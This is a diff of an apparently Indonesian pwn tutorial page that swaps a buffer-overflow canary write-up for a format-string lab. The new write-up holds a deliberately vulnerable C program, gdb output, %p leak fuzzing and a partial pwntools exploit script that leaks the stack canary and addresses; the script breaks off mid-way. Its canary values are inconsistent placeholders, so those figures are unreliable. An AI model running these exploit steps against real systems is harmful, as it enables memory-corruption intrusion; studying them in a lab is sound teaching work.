@@ -40,24 +40,43 @@
 
   
   
-    <meta name="description" content="1. Basic File Checks
-Lakukan pemeriksaan awal pada biner:
-# Compile dengan stack canary
-gcc -m32 -fstack-protector-all bof4.c -o bof4
+    <meta name="description" content="📝 Source Code Target
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
 
-# Periksa properti file
-file bof4
-checksec bof4
-Output:
-bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
 
-[*] &#39;/home/user/bof4&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts(&#34;We will evaluate any format string you give us with printf().&#34;);
+
+  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+  if (file == NULL) {
+    printf(&#34;flag.txt is missing!\n&#34;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1) {
+    printf(&#34;&gt; &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }
+  return 0;
+}
+🔍 Langkah 1: Basic File Checks
+Compile program dengan perlindungan stack canary:">
   
 
   <title>
@@ -79,42 +98,80 @@ Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanp
   
 
   
-    <meta name="description" content="1. Basic File Checks
-Lakukan pemeriksaan awal pada biner:
-# Compile dengan stack canary
-gcc -m32 -fstack-protector-all bof4.c -o bof4
+    <meta name="description" content="📝 Source Code Target
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
 
-# Periksa properti file
-file bof4
-checksec bof4
-Output:
-bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
 
-[*] &#39;/home/user/bof4&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
-    <meta property="og:description" content="1. Basic File Checks
-Lakukan pemeriksaan awal pada biner:
-# Compile dengan stack canary
-gcc -m32 -fstack-protector-all bof4.c -o bof4
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
 
-# Periksa properti file
-file bof4
-checksec bof4
-Output:
-bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
+  puts(&#34;We will evaluate any format string you give us with printf().&#34;);
 
-[*] &#39;/home/user/bof4&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
+  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+  if (file == NULL) {
+    printf(&#34;flag.txt is missing!\n&#34;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1) {
+    printf(&#34;&gt; &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }
+  return 0;
+}
+🔍 Langkah 1: Basic File Checks
+Compile program dengan perlindungan stack canary:">
+    <meta property="og:description" content="📝 Source Code Target
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
+
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts(&#34;We will evaluate any format string you give us with printf().&#34;);
+
+  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+  if (file == NULL) {
+    printf(&#34;flag.txt is missing!\n&#34;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1) {
+    printf(&#34;&gt; &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }
+  return 0;
+}
+🔍 Langkah 1: Basic File Checks
+Compile program dengan perlindungan stack canary:">
     <meta property="og:image" content="/path/to/default-image.jpg">
     <meta name="twitter:image" content="/path/to/default-image.jpg">
 
@@ -122,24 +179,43 @@ Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanp
   <meta property="og:url" content="/posts/bypass-stack-canary/">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1">
-  <meta name="twitter:description" content="1. Basic File Checks
-Lakukan pemeriksaan awal pada biner:
-# Compile dengan stack canary
-gcc -m32 -fstack-protector-all bof4.c -o bof4
+  <meta name="twitter:description" content="📝 Source Code Target
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
 
-# Periksa properti file
-file bof4
-checksec bof4
-Output:
-bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
 
-[*] &#39;/home/user/bof4&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).">
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts(&#34;We will evaluate any format string you give us with printf().&#34;);
+
+  FILE *file = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+  if (file == NULL) {
+    printf(&#34;flag.txt is missing!\n&#34;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1) {
+    printf(&#34;&gt; &#34;);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }
+  return 0;
+}
+🔍 Langkah 1: Basic File Checks
+Compile program dengan perlindungan stack canary:">
 </head>
 
 
@@ -172,206 +248,244 @@ Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanp
 
     
 
-    <h2 id="1-basic-file-checks">1. Basic File Checks</h2>
-<p>Lakukan pemeriksaan awal pada biner:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Compile dengan stack canary</span>
-</span></span><span style="display:flex;"><span>gcc -m32 -fstack-protector-all bof4.c -o bof4
+    <h2 id="-source-code-target">📝 Source Code Target</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/types.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>(<span style="color:#ee82ee">int</span> argc, <span style="color:#ee82ee">char</span> **argv){
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> flag[<span style="color:#f60">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> *flag_ptr = flag;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Periksa properti file</span>
-</span></span><span style="display:flex;"><span>file bof4
-</span></span><span style="display:flex;"><span>checksec bof4
+</span></span><span style="display:flex;"><span>  <span style="color:#0f0">// Set the gid to the effective gid
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ee82ee">gid_t</span> gid = <span style="color:#ff0">getegid</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setresgid</span>(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;We will evaluate any format string you give us with printf().&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  FILE *file = <span style="color:#ff0">fopen</span>(<span style="color:#87ceeb">&#34;flag.txt&#34;</span>, <span style="color:#87ceeb">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">if</span> (file == NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;flag.txt is missing!</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">exit</span>(<span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">fgets</span>(flag, <span style="color:#f00">sizeof</span>(flag), file);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">while</span>(<span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">fgets</span>(buf, <span style="color:#f00">sizeof</span>(buf), stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(buf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="-langkah-1-basic-file-checks">🔍 Langkah 1: Basic File Checks</h2>
+<p>Compile program dengan perlindungan stack canary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -m32 -fstack-protector -no-pie format_vuln.c -o format_vuln
+</span></span></code></pre></div><p>Lakukan pengecekan keamanan binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checksec format_vuln
 </span></span></code></pre></div><p><strong>Output:</strong></p>
-<pre tabindex="0"><code>bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
-
-[*] &#39;/home/user/bof4&#39;
+<pre tabindex="0"><code>[*] &#39;/home/user/format_vuln&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-</code></pre><p><strong>Kesimpulan:</strong> Biner 32-bit dengan proteksi <strong>Stack Canary</strong> dan <strong>NX Enabled</strong>, namun tanpa PIE (alamat fungsi statis).</p>
-<h2 id="2-review-source-code">2. Review Source Code</h2>
-<p><strong>bof4.c:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
-</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
-</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
-</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
-</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Congrats, you bypassed the canary!</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Level 4: Canary is enabled. Can you bypass it?&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Input: &#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">256</span>, stdin);  <span style="color:#0f0">// VULNERABILITY: Buffer overflow!
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;You said: %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buf); <span style="color:#0f0">// VULNERABILITY: Format string
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#f60">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Exiting...&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><strong>Vulnerabilities:</strong></p>
-<ol>
-<li><strong>Buffer Overflow:</strong> <code>fgets</code> membaca 256 byte ke buffer 64 byte.</li>
-<li><strong>Format String:</strong> <code>printf(buf)</code> memungkinkan leak data dari stack.</li>
-</ol>
-<p><strong>Target:</strong> Eksploitasi untuk menjalankan fungsi <code>win()</code>.</p>
-<h2 id="3-analisis-assembly-dengan-pwndbg">3. Analisis Assembly dengan pwndbg</h2>
-<p>Breakdown fungsi <code>vuln</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./bof4
-</span></span><span style="display:flex;"><span>disass vuln
-</span></span></code></pre></div><p><strong>Output Penting:</strong></p>
-<pre tabindex="0"><code>   0x080491d4 &lt;+18&gt;:    mov    eax,gs:0x14        ; Load canary dari TLS
-   0x080491da &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax ; Simpan canary di [ebp-0xc]
-   ...
-   0x08049218 &lt;+86&gt;:    call   0x8049060 &lt;fgets@plt&gt; ; fgets(buf, 256, stdin)
-   ...
-   0x08049233 &lt;+113&gt;:   xor    eax,DWORD PTR gs:0x14 ; Verifikasi canary
-   0x0804923a &lt;+120&gt;:   je     0x8049241 &lt;vuln+127&gt;   ; Jika valid, lanjutkan
-   0x0804923c &lt;+122&gt;:   call   0x80490a0 &lt;__stack_chk_fail_local&gt; ; Jika corrupt, abort
-</code></pre><p><strong>Layout Stack di <code>vuln()</code>:</strong></p>
-<table>
-  <thead>
-      <tr>
-          <th>Alamat Relatif</th>
-          <th>Konten</th>
-          <th>Ukuran</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>ebp - 0x4c</code></td>
-          <td><code>buf[64]</code></td>
-          <td>64 byte</td>
-      </tr>
-      <tr>
-          <td><code>ebp - 0x0c</code></td>
-          <td><strong>Canary</strong></td>
-          <td>4 byte</td>
-      </tr>
-      <tr>
-          <td><code>ebp + 0x00</code></td>
-          <td>Saved EBP</td>
-          <td>4 byte</td>
-      </tr>
-      <tr>
-          <td><code>ebp + 0x04</code></td>
-          <td>Return Address</td>
-          <td>4 byte</td>
-      </tr>
-  </tbody>
-</table>
-<p><strong>Offset Penting:</strong></p>
+</code></pre><h2 id="-langkah-2-review-source-code">🔍 Langkah 2: Review Source Code</h2>
+<p>Program memiliki:</p>
 <ul>
-<li>Start buffer ke canary: <strong>64 byte</strong></li>
-<li>Start buffer ke return address: 64 + 4 (canary) + 4 (saved ebp) = <strong>72 byte</strong></li>
+<li>Buffer <code>buf[64]</code> untuk input user</li>
+<li>Variabel <code>flag[64]</code> yang berisi flag dari file</li>
+<li>Kerentanan format string di <code>printf(buf)</code></li>
+<li>Loop tak terbatas yang memungkinkan multiple exploits</li>
 </ul>
-<h2 id="4-strategi-exploit-canary-leak--bypass">4. Strategi Exploit: Canary Leak &amp; Bypass</h2>
-<p>Langkah-langkah:</p>
+<h2 id="-langkah-3-disassemble-dengan-pwndbg">🔍 Langkah 3: Disassemble dengan pwndbg</h2>
+<p>Analisis fungsi main dengan GDB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
+</span></span><span style="display:flex;"><span>pwndbg&gt; disass main
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>Dump of assembler code for function main:
+   0x080492a6 &lt;+0&gt;:     lea    ecx,[esp+0x4]
+   0x080492aa &lt;+4&gt;:     and    esp,0xfffffff0
+   0x080492ad &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
+   0x080492b0 &lt;+10&gt;:    push   ebp
+   0x080492b1 &lt;+11&gt;:    mov    ebp,esp
+   0x080492b3 &lt;+13&gt;:    push   edi
+   0x080492b4 &lt;+14&gt;:    push   esi
+   0x080492b5 &lt;+15&gt;:    push   ebx
+   0x080492b6 &lt;+16&gt;:    push   ecx
+   0x080492b7 &lt;+17&gt;:    sub    esp,0x70
+   0x080492ba &lt;+20&gt;:    mov    eax,gs:0x14
+   0x080492c0 &lt;+26&gt;:    mov    DWORD PTR [ebp-0x1c],eax
+   0x080492c3 &lt;+29&gt;:    xor    eax,eax
+   ... [truncated]...
+</code></pre><p>Canary disimpan di <code>[ebp-0x1c]</code> (offset 0x1c dari EBP).</p>
+<h2 id="-langkah-4-rencana-serangan">🔍 Langkah 4: Rencana Serangan</h2>
 <ol>
-<li><strong>Leak Canary:</strong> Manfaatkan format string <code>printf(buf)</code> untuk membaca nilai canary dari stack.</li>
-<li><strong>Bypass Check:</strong> Gunakan nilai canary yang telah dileak pada payload overflow agar check dapat passed.</li>
-<li><strong>Hijack EIP:</strong> Timpa return address dengan alamat fungsi <code>win</code>.</li>
+<li><strong>Leak canary</strong> melalui format string vulnerability</li>
+<li><strong>Leak address</strong> untuk bypass ASLR (jika perlu)</li>
+<li><strong>Overwrite return address</strong> dengan payload</li>
+<li><strong>Jaga integritas canary</strong> dengan menuliskannya kembali</li>
 </ol>
-<h2 id="5-langkah-1-leak-canary-via-format-string">5. Langkah 1: Leak Canary via Format String</h2>
-<p>Canary disimpan di stack. Kita gunakan format specifier <code>%p</code> atau <code>$p</code> untuk membacanya.</p>
-<p><strong>Fuzzing Posisi Canary:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+<h2 id="-langkah-5-fuzz-format-string-untuk-leak">🔍 Langkah 5: Fuzz Format String untuk Leak</h2>
+<p>Coba leak nilai stack dengan berbagai offset:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%p &#34; * 20&#39;</span> | ./format_vuln
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>&gt; 0x40 0xf7f8a5c0 0x80492fd 0x1 0x1 0xffffd104 0xffffd10c 0x80492a0 0xffffd100 0x0 0xf7ffd000 0x0 0xf7f8a5c0 0x1 0x80492a0 0x0 0x0 0x0 0x0 0x0 
+</code></pre><p>Coba dengan offset tertentu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%19$p %20$p %21$p %22$p&#34;&#39;</span> | ./format_vuln
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>&gt; 0x0 0x0 0x0 0xf0f0f0f0
+</code></pre><p>Ditemukan canary di offset 22 (nilai 0xf0f0f0f0 adalah canary dummy).</p>
+<h2 id="-langkah-6-locating-canary-dengan-gdb">🔍 Langkah 6: Locating Canary dengan GDB</h2>
+<p>Gunakan GDB untuk memverifikasi posisi canary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb format_vuln
+</span></span><span style="display:flex;"><span>pwndbg&gt; b *main+26
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span>pwndbg&gt; canary
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>Canary = 0xabcd1234 (dummy value)
+</code></pre><p>Cari lokasi canary di stack:</p>
+<pre tabindex="0"><code>pwndbg&gt; p $ebp-0x1c
+$1 = (void *) 0xffffcfdc
+pwndbg&gt; telescope 0xffffcfdc
+</code></pre><p>Hitung offset dari ESP:</p>
+<pre tabindex="0"><code>Offset = (0xffffcfdc - initial_esp) / 4 = 22
+</code></pre><h2 id="-langkah-7-leak-address-yang-diperlukan">🔍 Langkah 7: Leak Address yang Diperlukan</h2>
+<p>Leak address fungsi dan libc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 -c <span style="color:#87ceeb">&#39;print &#34;%3$p %5$p %22$p&#34;&#39;</span> | ./format_vuln
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<pre tabindex="0"><code>&gt; 0x80492fd 0xffffd104 0xabcd1234
+</code></pre><p>Dapatkan:</p>
+<ul>
+<li>Address fungsi: 0x80492fd</li>
+<li>Stack address: 0xffffd104</li>
+<li>Canary: 0xabcd1234</li>
+</ul>
+<h2 id="-langkah-8-eksploit-dengan-pwntools">🔍 Langkah 8: Eksploit dengan Pwntools</h2>
+<p>Buat script exploit berikut:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
+</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./format_vuln&#39;</span>
+</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload fuzz</span>
-</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">20</span>):
-</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$08p &#39;</span>.encode()  <span style="color:#0f0"># %[pos]$p</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># p = process(&#39;./format_vuln&#39;)</span>
+</span></span><span style="display:flex;"><span>p = remote(<span style="color:#87ceeb">&#39;localhost&#39;</span>, <span style="color:#f60">1337</span>)  <span style="color:#0f0"># Untuk remote target</span>
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak canary</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%22$p&#39;</span>)
+</span></span><span style="display:flex;"><span>canary_leak = p.recvline().strip()
+</span></span><span style="display:flex;"><span>canary = int(canary_leak, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Canary: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % canary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak stack address untuk menghitung offset return address</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%5$p&#39;</span>)
+</span></span><span style="display:flex;"><span>stack_leak = p.recvline().strip()
+</span></span><span style="display:flex;"><span>stack_addr = int(stack_leak, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Stack address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % stack_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung offset return address</span>
+</span></span><span style="display:flex;"><span>return_addr = stack_addr - <span style="color:#f60">0x24</span>  <span style="color:#0f0"># Adjust berdasarkan analisis GDB</span>
+</span></span><span style="display:flex;"><span>log.info(<span style="color:#87ceeb">&#34;Return address: 0x</span><span style="color:#87ceeb">%x</span><span style="color:#87ceeb">&#34;</span> % return_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Address fungsi win atau system</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Dalam kasus ini, kita akan return ke system(&#34;/bin/sh&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Leak address libc untuk menghitung base address</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%3$p&#39;</span>)
+</span></span><span style="display:flex;"><span>func_leak = p.recvline().strip()
